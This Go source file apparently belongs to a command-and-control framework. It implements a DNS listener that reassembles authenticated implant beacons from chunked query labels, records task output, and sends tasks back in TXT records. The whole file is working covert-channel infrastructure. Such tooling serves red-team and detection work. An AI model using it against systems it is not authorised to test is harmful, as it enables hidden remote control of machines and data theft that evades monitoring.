package listener

import (
	"encoding/base32"
	"encoding/hex"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/aelder202/sable/internal/nonce"
	"github.com/aelder202/sable/internal/protocol"
	"github.com/aelder202/sable/internal/session"
	mdns "github.com/miekg/dns"
)

const (
	dnsChunkSize           = 30  // bytes per chunk before base32 encoding
	maxDNSSessions         = 256 // cap on concurrent in-progress beacon assemblies
	maxDNSSessionsPerHost  = 8
	dnsSessExpiry          = 60 * time.Second
	maxDNSBeaconBytes      = 15 * 1024
	maxDNSTaskPayloadBytes = 8 * 1024
	maxDNSChunks           = 512
	maxDNSRequestsPerHost  = 1024
	dnsRateWindow          = 10 * time.Second
	maxDNSRateBuckets      = 4096
	dnsResponseChunkBytes  = 1200
	maxDNSResponseBytes    = 96 * 1024
)

// ChunkForDNS splits data into chunks suitable for DNS label encoding.
// Exported so the agent transport can use the same chunking logic.
func ChunkForDNS(data []byte) [][]byte {
	var chunks [][]byte
	for len(data) > 0 {
		n := dnsChunkSize
		if n > len(data) {
			n = len(data)
		}
		chunks = append(chunks, data[:n])
		data = data[n:]
	}
	return chunks
}

// dnsBeaconSession accumulates chunks from an in-progress DNS beacon.
type dnsBeaconSession struct {
	chunks      map[int][]byte
	totalChunks int
	createdAt   time.Time
}

type dnsResponseSession struct {
	chunks    [][]byte
	createdAt time.Time
}

// DNSHandler is an authoritative DNS server that decodes agent beacons.
// Query format: <base32chunk>.<index>.<total>.<sessionID>.<agentID>.<authTag>.<domain>
type DNSHandler struct {
	store     *session.Store
	nonces    *nonce.Cache
	domain    string // authoritative domain, must end with "."
	sources   *dnsRateLimiter
	mu        sync.Mutex
	sessions  map[string]*dnsBeaconSession
	responses map[string]*dnsResponseSession
}

// NewDNSHandler creates a DNSHandler for the given authoritative domain.
// domain must end with "." (e.g. "c2.example.com.")
func NewDNSHandler(store *session.Store, nc *nonce.Cache, domain string) *DNSHandler {
	return &DNSHandler{
		store:     store,
		nonces:    nc,
		domain:    domain,
		sources:   newDNSRateLimiter(),
		sessions:  make(map[string]*dnsBeaconSession),
		responses: make(map[string]*dnsResponseSession),
	}
}

type dnsBucket struct {
	count   int
	resetAt time.Time
}

type dnsRateLimiter struct {
	mu        sync.Mutex
	buckets   map[string]*dnsBucket
	nextSweep time.Time
}

func newDNSRateLimiter() *dnsRateLimiter {
	return &dnsRateLimiter{buckets: make(map[string]*dnsBucket)}
}

func (rl *dnsRateLimiter) allow(source string) bool {
	rl.mu.Lock()
	defer rl.mu.Unlock()
	now := time.Now()
	if !now.Before(rl.nextSweep) {
		for key, bucket := range rl.buckets {
			if !now.Before(bucket.resetAt) {
				delete(rl.buckets, key)
			}
		}
		rl.nextSweep = now.Add(dnsRateWindow)
	}
	b, ok := rl.buckets[source]
	if !ok {
		if len(rl.buckets) >= maxDNSRateBuckets {
			return false
		}
		rl.buckets[source] = &dnsBucket{
			count:   1,
			resetAt: now.Add(dnsRateWindow),
		}
		return true
	}
	if !now.Before(b.resetAt) {
		b.count = 1
		b.resetAt = now.Add(dnsRateWindow)
		return true
	}
	if b.count >= maxDNSRequestsPerHost {
		return false
	}
	b.count++
	return true
}

// evictExpired removes sessions older than dnsSessExpiry. Must be called with h.mu held.
func (h *DNSHandler) evictExpired() {
	cutoff := time.Now().Add(-dnsSessExpiry)
	for id, s := range h.sessions {
		if s.createdAt.Before(cutoff) {
			delete(h.sessions, id)
		}
	}
	for id, s := range h.responses {
		if s.createdAt.Before(cutoff) {
			delete(h.responses, id)
		}
	}
}

// ServeDNS implements dns.Handler.
// Query name format: <base32chunk>.<chunkIndex>.<totalChunks>.<sessionID>.<agentID>.<authTag>.<domain>
func (h *DNSHandler) ServeDNS(w mdns.ResponseWriter, r *mdns.Msg) {
	m := new(mdns.Msg)
	m.SetReply(r)
	m.Authoritative = true

	if len(r.Question) == 0 {
		w.WriteMsg(m) //nolint:errcheck
		return
	}
	sourceIP := remoteIP(w.RemoteAddr())

	qname := strings.ToLower(r.Question[0].Name)
	domain := strings.ToLower(h.domain)

	if !strings.HasSuffix(qname, domain) {
		w.WriteMsg(m) //nolint:errcheck
		return
	}

	// Strip the authoritative domain suffix and parse labels.
	inner := strings.TrimSuffix(qname, domain)
	inner = strings.TrimSuffix(inner, ".")
	labels := strings.Split(inner, ".")
	if len(labels) == 5 && labels[0] == "r" {
		h.serveResponseChunk(w, r, m, sourceIP, labels[2], labels[3], labels[1], labels[4])
		return
	}
	// Expected: [base32chunk, chunkIndex, totalChunks, sessionID, agentID, authTag]
	if len(labels) != 6 {
		w.WriteMsg(m) //nolint:errcheck
		return
	}

	b32chunk := strings.ToUpper(labels[0])
	chunkIdx, err := strconv.Atoi(labels[1])
	if err != nil {
		w.WriteMsg(m) //nolint:errcheck
		return
	}
	totalChunks, err := strconv.Atoi(labels[2])
	if err != nil {
		w.WriteMsg(m) //nolint:errcheck
		return
	}
	sessionID := labels[3]
	agentID := labels[4]
	authTag := labels[5]

	if !validDNSSessionID(sessionID) || !validAgentID(agentID) ||
		totalChunks <= 0 ||
		totalChunks > maxDNSChunks ||
		totalChunks*dnsChunkSize > maxDNSBeaconBytes ||
		chunkIdx < 0 ||
		chunkIdx >= totalChunks {
		w.WriteMsg(m) //nolint:errcheck
		return
	}

	chunkData, err := base32.StdEncoding.WithPadding(base32.NoPadding).DecodeString(b32chunk)
	if err != nil || len(chunkData) == 0 || len(chunkData) > dnsChunkSize {
		w.WriteMsg(m) //nolint:errcheck
		return
	}

	// Authenticate every chunk before allocating rate-limit or reassembly state.
	secret, knownAgent := h.store.Secret(agentID)
	verificationSecret := secret
	if !knownAgent {
		verificationSecret = make([]byte, 32)
	}
	validTag := protocol.VerifyDNSChunkAuthTag(verificationSecret, authTag, sessionID, agentID, chunkIdx, totalChunks, chunkData)
	if !knownAgent || !validTag || !h.sources.allow(sourceIP) {
		w.WriteMsg(m) //nolint:errcheck
		return
	}

	// Accumulate chunk with session limits and expiry.
	sessionKey := sourceIP + "|" + agentID + "|" + sessionID
	h.mu.Lock()
	h.evictExpired()
	if chunkIdx == totalChunks-1 {
		if response, ok := h.responses[sessionKey]; ok && len(response.chunks) > 0 {
			chunk := response.chunks[0]
			total := len(response.chunks)
			h.mu.Unlock()
			appendDNSResponseTXT(m, r.Question[0].Name, chunk, 0, total)
			w.WriteMsg(m) //nolint:errcheck
			return
		}
	}
	sess, ok := h.sessions[sessionKey]
	if !ok {
		if len(h.sessions) >= maxDNSSessions || h.sessionCountForSourceLocked(sourceIP) >= maxDNSSessionsPerHost {
			// Session table full; drop request to prevent memory exhaustion.
			h.mu.Unlock()
			w.WriteMsg(m) //nolint:errcheck
			return
		}
		sess = &dnsBeaconSession{
			chunks:      make(map[int][]byte),
			totalChunks: totalChunks,
			createdAt:   time.Now(),
		}
		h.sessions[sessionKey] = sess
	} else if sess.totalChunks != totalChunks {
		h.mu.Unlock()
		w.WriteMsg(m) //nolint:errcheck
		return
	}
	sess.chunks[chunkIdx] = append([]byte(nil), chunkData...)
	if len(sess.chunks) != sess.totalChunks {
		h.mu.Unlock()
		w.WriteMsg(m) //nolint:errcheck
		return
	}

	// Reassemble and remove the session while holding one lock so duplicate
	// final chunks cannot race a second beacon decode.
	var assembled []byte
	for i := 0; i < totalChunks; i++ {
		chunk, ok := sess.chunks[i]
		if !ok || len(assembled)+len(chunk) > maxDNSBeaconBytes {
			delete(h.sessions, sessionKey)
			h.mu.Unlock()
			w.WriteMsg(m) //nolint:errcheck
			return
		}
		assembled = append(assembled, chunk...)
	}
	delete(h.sessions, sessionKey)
	h.mu.Unlock()

	beacon, err := protocol.DecodeBeacon(assembled, secret)
	if err != nil {
		w.WriteMsg(m) //nolint:errcheck
		return
	}

	if !validBeacon(beacon, agentID, time.Now()) {
		w.WriteMsg(m) //nolint:errcheck
		return
	}

	// Nonce replay check. Atomic to close TOCTOU window between Seen and Add.
	if h.nonces.SeenOrAdd(beacon.Nonce) {
		w.WriteMsg(m) //nolint:errcheck
		return
	}

	h.store.UpdateInfoWithTransport(beacon.AgentID, beacon.Hostname, beacon.OS, beacon.Arch, "dns")
	outputComplete := true
	if beacon.TaskOutput != nil {
		outputComplete = h.store.RecordOutput(beacon.AgentID, beacon.TaskOutput)
	}

	var task *protocol.Task
	if outputComplete {
		task = h.store.DeliverTask(beacon.AgentID)
	}
	if task == nil {
		task = &protocol.Task{Type: "noop"}
	}

	resp, err := protocol.EncodeTask(task, secret)
	if err != nil {
		w.WriteMsg(m) //nolint:errcheck
		return
	}
	if len(resp) > maxDNSResponseBytes {
		transportError := &protocol.Task{
			ID:      task.ID,
			Type:    "transport_error",
			Payload: "task cannot be delivered over DNS; reconnect the agent over HTTPS",
		}
		resp, err = protocol.EncodeTask(transportError, secret)
		if err != nil {
			w.WriteMsg(m) //nolint:errcheck
			return
		}
	}

	responseChunks := splitDNSResponse(resp)
	h.mu.Lock()
	h.evictExpired()
	if h.responseCountForSourceLocked(sourceIP) >= maxDNSSessionsPerHost {
		h.evictOldestResponseLocked(sourceIP)
	} else if len(h.responses) >= maxDNSSessions {
		h.evictOldestResponseLocked("")
	}
	h.responses[sessionKey] = &dnsResponseSession{chunks: responseChunks, createdAt: time.Now()}
	h.mu.Unlock()
	appendDNSResponseTXT(m, r.Question[0].Name, responseChunks[0], 0, len(responseChunks))
	w.WriteMsg(m) //nolint:errcheck
}

func (h *DNSHandler) serveResponseChunk(w mdns.ResponseWriter, r, m *mdns.Msg, sourceIP, sessionID, agentID, indexText, authTag string) {
	if !validDNSSessionID(sessionID) || !validAgentID(agentID) {
		w.WriteMsg(m) //nolint:errcheck
		return
	}
	index, err := strconv.Atoi(indexText)
	if err != nil || index < 0 {
		w.WriteMsg(m) //nolint:errcheck
		return
	}
	secret, knownAgent := h.store.Secret(agentID)
	verificationSecret := secret
	if !knownAgent {
		verificationSecret = make([]byte, 32)
	}
	validTag := protocol.VerifyDNSResponseAuthTag(verificationSecret, authTag, sessionID, agentID, index)
	if !knownAgent || !validTag || !h.sources.allow(sourceIP) {
		w.WriteMsg(m) //nolint:errcheck
		return
	}
	key := sourceIP + "|" + agentID + "|" + sessionID
	h.mu.Lock()
	h.evictExpired()
	response, ok := h.responses[key]
	if !ok || index >= len(response.chunks) {
		h.mu.Unlock()
		w.WriteMsg(m) //nolint:errcheck
		return
	}
	chunk := append([]byte(nil), response.chunks[index]...)
	total := len(response.chunks)
	h.mu.Unlock()
	appendDNSResponseTXT(m, r.Question[0].Name, chunk, index, total)
	w.WriteMsg(m) //nolint:errcheck
}

func (h *DNSHandler) sessionCountForSourceLocked(sourceIP string) int {
	prefix := sourceIP + "|"
	count := 0
	for key := range h.sessions {
		if strings.HasPrefix(key, prefix) {
			count++
		}
	}
	return count
}

func (h *DNSHandler) responseCountForSourceLocked(sourceIP string) int {
	prefix := sourceIP + "|"
	count := 0
	for key := range h.responses {
		if strings.HasPrefix(key, prefix) {
			count++
		}
	}
	return count
}

func (h *DNSHandler) evictOldestResponseLocked(sourceIP string) {
	prefix := sourceIP + "|"
	oldestKey := ""
	var oldest time.Time
	for key, response := range h.responses {
		if sourceIP != "" && !strings.HasPrefix(key, prefix) {
			continue
		}
		if oldestKey == "" || response.createdAt.Before(oldest) {
			oldestKey, oldest = key, response.createdAt
		}
	}
	if oldestKey != "" {
		delete(h.responses, oldestKey)
	}
}

func splitDNSResponse(data []byte) [][]byte {
	chunks := make([][]byte, 0, (len(data)+dnsResponseChunkBytes-1)/dnsResponseChunkBytes)
	for len(data) > 0 {
		n := dnsResponseChunkBytes
		if n > len(data) {
			n = len(data)
		}
		chunks = append(chunks, append([]byte(nil), data[:n]...))
		data = data[n:]
	}
	return chunks
}

func appendDNSResponseTXT(m *mdns.Msg, name string, chunk []byte, index, total int) {
	payload := hex.EncodeToString(chunk)
	if total > 1 {
		payload = "v1:" + strconv.Itoa(total) + ":" + strconv.Itoa(index) + ":" + payload
	}
	stringsForTXT := make([]string, 0, (len(payload)+254)/255)
	for len(payload) > 255 {
		stringsForTXT = append(stringsForTXT, payload[:255])
		payload = payload[255:]
	}
	stringsForTXT = append(stringsForTXT, payload)
	m.Answer = append(m.Answer, &mdns.TXT{
		Hdr: mdns.RR_Header{Name: name, Rrtype: mdns.TypeTXT, Class: mdns.ClassINET, Ttl: 0},
		Txt: stringsForTXT,
	})
}

func remoteIP(addr net.Addr) string {
	if addr == nil {
		return ""
	}
	host, _, err := net.SplitHostPort(addr.String())
	if err != nil {
		return addr.String()
	}
	return host
}

func validDNSSessionID(sessionID string) bool {
	if len(sessionID) != 16 {
		return false
	}
	_, err := hex.DecodeString(sessionID)
	return err == nil
}
